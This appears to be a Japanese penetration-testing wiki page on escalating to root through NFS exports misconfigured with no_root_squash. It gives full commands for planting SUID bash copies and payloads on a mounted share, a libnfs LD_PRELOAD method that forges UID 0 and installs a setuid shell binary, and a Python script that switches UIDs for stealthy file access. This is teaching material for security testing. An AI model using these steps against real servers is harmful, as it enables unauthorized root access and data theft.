# NFS No Root Squash の設定ミスによる権限昇格

{{#include ../../banners/hacktricks-training.md}}

## Squashing の基本情報

NFS AUTH_SYS/AUTH_UNIX では、サーバーは各 RPC リクエストで送信された `uid` と `gid` に基づいてファイル権限をチェックします。Kerberos などの他のセキュリティフレーバーでは異なる認証情報が使用され、サーバーは権限チェックの前に数値の認証情報をマッピングする場合があります。<sup>[[4]](#references)[[5]](#references)</sup>

- **`all_squash`**: すべての UID と GID を匿名アカウントにマッピングします。Linux ではデフォルトで `nobody` (65534) です。root 以外のリクエストでは、デフォルトで `no_all_squash` が使用されます。<sup>[[4]](#references)</sup>
- **`root_squash`**: Linux でのデフォルト設定で、UID/GID 0 (root) のリクエストを匿名アカウントにマッピングします。他の UID と GID は squash されません。<sup>[[4]](#references)</sup>
- **`no_root_squash`**: root squashing を無効にするため、UID/GID 0 のリクエストはサーバー上で root として評価されます。<sup>[[4]](#references)</sup>

許可されたクライアントが、**`no_root_squash`** で設定された書き込み可能な **`/etc/exports`** の export をマウントできる場合、その UID/GID 0 のリクエストはサーバーの root ユーザーとして書き込みを行えます。<sup>[[4]](#references)</sup>

`root_squash` が再マッピングするのは UID/GID 0 のみです。AUTH_SYS では、許可されたクライアントの**ゼロ以外の数値 UID/GID**が、サーバー上の別のアカウントと一致する可能性があります。そのため、クライアントがその数値 ID でファイルを作成でき、サーバーがアクセスを許可する場合、書き込み可能な export は root squashing が有効でもユーザーをまたぐ経路になり得ます。SUID/SGID で受け渡しを行う場合は、ファイルの所有者、実行アクセス、サーバーのマウントにおける `nosuid` の状態、ACL、SELinux やその他のポリシーも確認してください。export されたパス名、`rw` オプション、または数値の一致だけでは、クライアントにアクセス権があること、export が有効であること、あるいは両方のホストで実効的な ID マッピングが同一であることは証明できません。列挙時は `/etc/exports` とローカルのメタデータを受動的に確認し、新たな share をマウントしたりテストファイルを作成したりしないでください。<sup>[[4]](#references)[[5]](#references)</sup>

**NFS** の詳細については、こちらを確認してください。

{{#ref}}
../../network-services-pentesting/nfs-service-pentesting.md
{{#endref}}

## 権限昇格

### リモート Exploit

bash を使う方法 1:
- 許可されたクライアント上で、root として書き込み可能な export をマウントし、**`/bin/bash`** をその中にコピーして **SUID** ビットを設定します。その後、`nosuid` を使用していない victim のマウントから実行します。<sup>[[2]](#references)[[4]](#references)</sup>
    - アップロードしたファイルの所有者を root のままにするには、サーバーで **`no_root_squash`** が有効である必要があります。root が squash される場合、別のアカウントの SUID バイナリを作成できるのは、クライアントがそのアカウントの数値 UID/GID で正当にファイルを作成または所有できる場合に限られます。<sup>[[4]](#references)</sup>

```bash
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```

Option 2: コンパイル済みのCコードを使用:
- 許可されたクライアントからディレクトリをマウントし、SUID権限を悪用するコンパイル済みpayloadをコピーして、**SUID** bitを設定し、victim上で実行します（[C SUID payloads](../processes-crontab-systemd-dbus/payloads-to-execute.md#c)を参照）。
    - 以前と同じ制限があります。

```bash
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```

### Local Exploit

> [!TIP]
> **自分のマシンから被害者マシンへのトンネルを作成できる場合でも、必要なポートをトンネリングすれば Remote 版を使ってこの権限昇格を悪用できます**。\
> `/etc/exports` でエクスポート先が被害者の IP に制限されている場合、次の手法が役立ちます。リモートクライアントからはマウントできませんが、ローカル手法なら許可されたホストですでにマウント済みの共有を介して操作できます。<sup>[[2]](#references)</sup>\
> この非特権の libnfs 手法では、プロセスが予約されていない送信元ポートを使用できるよう、エクスポートに **`/etc/exports`** の `insecure` フラグを指定する必要があります。デフォルトは `secure` ですが、予約済みポートにバインドできるプロセスにはこのオプションは不要です。<sup>[[1]](#references)[[4]](#references)</sup>

### 基本情報

NFSv3 AUTH_UNIX クライアントは各呼び出しに実効 UID、GID、グループを含め、サーバーはそれらを権限チェックに使用します。このローカル手法は、[libnfs](https://github.com/sahlberg/libnfs) を介して RPC 認証情報を偽造し、この仕組みを悪用します。libnfs の preload module は、NFS コンテキスト内の UID/GID の上書きをサポートしています。<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[5]](#references)</sup>

#### ライブラリのコンパイル

libnfs の例は対象カーネルに合わせた調整が必要な場合があります。ここで紹介する手順では、preload module をコンパイルする前に fallocate システムコールをコメントアウトするよう明記されています。<sup>[[1]](#references)[[2]](#references)</sup>

```bash
./bootstrap
./configure
make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
```

#### Exploit の実行

この例では、shell を起動する小さな C helper を作成し、それを share に配置します。次に、NFS context で UID 0 の `ld_nfs.so` を使い、SUID-root にします。<sup>[[1]](#references)[[2]](#references)</sup>

1. **exploit code をコンパイルする:**

```bash
cat pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
gcc pwn.c -o a.out
```

2. **UIDを偽装して、exploitを共有領域に置き、権限を変更する**。<sup>[[1]](#references)[[2]](#references)</sup>

```bash
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
```

3. **exploitを実行してroot権限を取得する**。<sup>[[2]](#references)</sup>

```bash
/mnt/share/a.out
#root
```

### ボーナス: ステルス性の高いファイルアクセスのための NFShell

root access を取得したら、この `nfsh.py` のパターンではコマンドを実行する前に実効 UID を対象ファイルの UID に設定するため、所有権を再帰的に変更せずにアクセスできます。<sup>[[2]](#references)</sup>

```python
#!/usr/bin/env python
# script from https://www.errno.fr/nfs_privesc.html
import sys
import os

def get_file_uid(filepath):
    try:
        uid = os.stat(filepath).st_uid
    except OSError as e:
        return get_file_uid(os.path.dirname(filepath))
    return uid

filepath = sys.argv[-1]
uid = get_file_uid(filepath)
os.setreuid(uid, uid)
os.system(' '.join(sys.argv[1:]))
```

次のように実行します:

```bash
# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
```

## References

- [1] [lnv42/libnfs](https://github.com/lnv42/libnfs)
- [2] [あまり知られていないNFS権限昇格の話](https://www.errno.fr/nfs_privesc.html)
- [3] [sahlberg/libnfs](https://github.com/sahlberg/libnfs)
- [4] [exports(5) — Linux マニュアルページ](https://man7.org/linux/man-pages/man5/exports.5.html)
- [5] [RFC 1813: NFS Version 3 プロトコル仕様](https://datatracker.ietf.org/doc/html/rfc1813)
{{#include ../../banners/hacktricks-training.md}}
